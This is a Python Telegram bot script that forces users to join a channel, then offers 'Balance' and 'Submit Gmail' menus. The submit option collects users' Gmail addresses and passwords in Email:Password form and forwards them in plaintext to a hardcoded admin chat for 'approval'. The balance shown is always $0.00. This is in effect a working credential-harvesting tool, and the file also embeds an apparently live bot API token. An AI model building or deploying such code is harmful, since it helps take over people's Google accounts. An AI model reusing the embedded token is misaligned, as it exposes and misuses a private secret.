import telebot
from telebot import types

# Your Bot Token and Channel Username
API_TOKEN = '8924995974:AAEKVpB992nDx3oVhvIbwD4601F-ZHHqQJA'
CHANNEL_USERNAME = '@A_ToolsX'
ADMIN_ID = 5582627293  # Your Telegram Chat ID

bot = telebot.TeleBot(API_TOKEN)

# Function to check if user is joined to the channel
def is_user_joined(user_id):
    try:
        chat_member = bot.get_chat_member(chat_id=CHANNEL_USERNAME, user_id=user_id)
        # Allows 'member', 'administrator', or 'creator' to pass without infinite loops
        if chat_member.status in ['member', 'administrator', 'creator']:
            return True
        return False
    except Exception as e:
        print(f"Error checking channel status: {e}")
        return False

# Function to send force join message with Refresh button
def send_force_join_msg(chat_id):
    markup = types.InlineKeyboardMarkup()
    btn_join = types.InlineKeyboardButton("🚀 JOIN CHANNEL", url=f"https://t.me/{CHANNEL_USERNAME.strip('@')}")
    btn_check = types.InlineKeyboardButton("🔄 Check / Refresh", callback_data="check_join")
    markup.add(btn_join)
    markup.add(btn_check)
    
    text = (
        "🚀 To use this bot, you must join our channel:\n"
        f"Everything you need in one place. ⚡\n\n"
        "Please join the channel and click 'Check / Refresh' below."
    )
    bot.send_message(chat_id, text, reply_markup=markup)

# /start Command Handler
@bot.message_handler(commands=['start'])
def start_command(message):
    user_id = message.from_user.id
    
    # Check if user is joined
    if not is_user_joined(user_id):
        send_force_join_msg(message.chat.id)
        return

    # Main Menu (if joined)
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add("Balance 💰", "My account 👤")
    markup.add("Submit Gmail 📧")
    bot.send_message(message.chat.id, "Welcome! The main menu is now active.", reply_markup=markup)

# Callback handler for the Refresh button
@bot.callback_query_handler(func=lambda call: call.data == "check_join")
def check_callback(call):
    if is_user_joined(call.from_user.id):
        bot.delete_message(call.message.chat.id, call.message.message_id)
        bot.answer_callback_query(call.id, "Thank you! You have successfully joined.")
        
        markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
        markup.add("Balance 💰", "My account 👤")
        markup.add("Submit Gmail 📧")
        bot.send_message(call.message.chat.id, "Main menu activated. Choose an option:", reply_markup=markup)
    else:
        bot.answer_callback_query(call.id, "❌ You haven't joined yet! Please join the channel first.", show_alert=True)

# Text Message Handler for Menu Buttons
@bot.message_handler(func=lambda message: True)
def handle_messages(message):
    user_id = message.from_user.id
    
    # Double check join status before executing any command
    if not is_user_joined(user_id):
        send_force_join_msg(message.chat.id)
        return

    if message.text == "Balance 💰":
        bot.send_message(message.chat.id, "💵 Current Balance: $0.00")
        
    elif message.text == "My account 👤":
        bot.send_message(message.chat.id, f"👤 Account ID: {user_id}\nStatus: Active")
        
    elif message.text == "Submit Gmail 📧":
        msg = bot.send_message(message.chat.id, "Please enter your Gmail and Password in this format (Email:Password):")
        bot.register_next_step_handler(msg, process_gmail_submission)

# Step handler to process Gmail and send notification to your Admin ID
def process_gmail_submission(message):
    user_id = message.from_user.id
    gmail_data = message.text
    
    bot.send_message(message.chat.id, "⏳ Your data has been submitted. Please wait for Admin approval.")
    
    # Create Inline Buttons for Admin (Approve / Reject)
    admin_markup = types.InlineKeyboardMarkup()
    btn_approve = types.InlineKeyboardButton("✅ Approve", callback_data=f"approve_{user_id}")
    btn_reject = types.InlineKeyboardButton("❌ Reject", callback_data=f"reject_{user_id}")
    admin_markup.add(btn_approve, btn_reject)
    
    admin_text = (
        "📥 **New Gmail Submission!**\n\n"
        f"👤 User ID: `{user_id}`\n"
        f"📝 Data: `{gmail_data}`\n\n"
        "Click below to Approve or Reject this request."
    )
    
    try:
        # Sends notification directly to your ID: 5582627293
        bot.send_message(ADMIN_ID, admin_text, parse_mode="Markdown", reply_markup=admin_markup)
    except Exception as e:
        print(f"Failed to send notification to Admin. Error: {e}")

# Admin Panel Callback Actions (Approve / Reject)
@bot.callback_query_handler(func=lambda call: call.data.startswith(('approve_', 'reject_')))
def admin_action_callback(call):
    action, target_user_id = call.data.split('_')
    
    # Secures the panel so only your ID can click the buttons
    if call.from_user.id != ADMIN_ID:
        bot.answer_callback_query(call.id, "❌ You are not authorized to use this admin panel!", show_alert=True)
        return
        
    if action == 'approve':
        bot.edit_message_text(f"✅ You have Approved this request.", chat_id=ADMIN_ID, message_id=call.message.message_id)
        try:
            bot.send_message(target_user_id, "🎉 Congratulations! Your submitted Gmail has been approved by the admin.")
        except:
            pass
            
    elif action == 'reject':
        bot.edit_message_text(f"❌ You have Rejected this request.", chat_id=ADMIN_ID, message_id=call.message.message_id)
        try:
            bot.send_message(target_user_id, "❌ Sorry! Your submitted Gmail has been rejected by the admin.")
        except:
            pass

# Start the bot polling
bot.infinity_polling()
                              
